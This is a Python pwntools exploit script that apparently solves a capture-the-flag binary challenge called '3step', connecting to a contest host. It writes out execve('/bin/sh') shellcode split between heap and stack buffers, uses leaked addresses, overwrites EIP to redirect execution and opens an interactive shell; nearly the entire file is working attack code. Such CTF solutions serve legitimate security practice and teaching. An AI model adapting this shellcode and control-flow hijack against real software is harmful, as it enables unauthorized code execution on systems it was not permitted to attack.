#!/usr/bin/python3

from pwn import *

context.arch = "i386"
#context.log_level = 'debug'

# Reference: https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-i386-and-x86-6
# %eax for syscall_number. %ebx, %ecx, %edx, %esi, %edi, %ebp are used for passing 6 parameters to system calls

"""
 0:   31 c0                   xor    eax, eax
 2:   50                      push   eax
 3:   68 2f 2f 73 68          push   0x68732f2f
 8:   68 2f 62 69 6e          push   0x6e69622f
 d:   89 e3                   mov    ebx, esp
 f:   89 c1                   mov    ecx, eax
11:   89 c2                   mov    edx, eax
13:   b0 0b                   mov    al, 0xb
15:   cd 80                   int    0x80       syscall(11) => execve("/bin/sh", 0, 0)
17:   31 c0                   xor    eax, eax
19:   40                      inc    eax
1a:   cd 80                   int    0x80       syscall(1)  => exit()
"""

# 17 bytes + "\n"
def generate_heap_payload():
    payload = b""
    payload += b"\x68\x2f\x62\x69\x6e"
    payload += b"\x89\xe3"
    payload += b"\x89\xc1"
    payload += b"\x89\xc2"
    payload += b"\xb0\x0b"
    payload += b"\xcd\x80"

    print(disasm(payload))
    print("heap payload len =", len(payload))
    return payload

# 16 bytes + "\n"
def generate_stack_payload(heap_addr):
    payload = b""

    payload += b"\x31\xc0"
    payload += b"\x50"
    payload += b"\x68\x2f\x2f\x73\x68"

    # 6 bytes to push heap_addr; ret
    # now land in the heap!
    payload += asm("push " + heap_addr)
    payload += asm("ret")

    print(disasm(payload))
    print("stack payload len =", len(payload))
    return payload

def main():
    #target = process("./3step")
    target = remote("chal.tuctf.com", 30504)
    prompt = target.recvuntil(b"Step 1: ").split(b"\n")

    heap_addr = int(prompt[2].rstrip(), 16)
    stack_addr = int(prompt[3].rstrip(), 16)
    print("heap addr =", hex(heap_addr))
    print("stack addr =", hex(stack_addr))

    # step 1 - fill heap buffer
    heap_payload = generate_heap_payload()
    target.sendline(heap_payload)
    target.recvuntil(b"Step 2: ")

    # step 2 - fill stack buffer
    stack_payload = generate_stack_payload(hex(heap_addr))
    target.sendline(stack_payload)
    target.recvuntil(b"Step 3: ")

    # step 3 - write eip to land in the stack
    target.sendline(p32(stack_addr))
    target.interactive()

main()
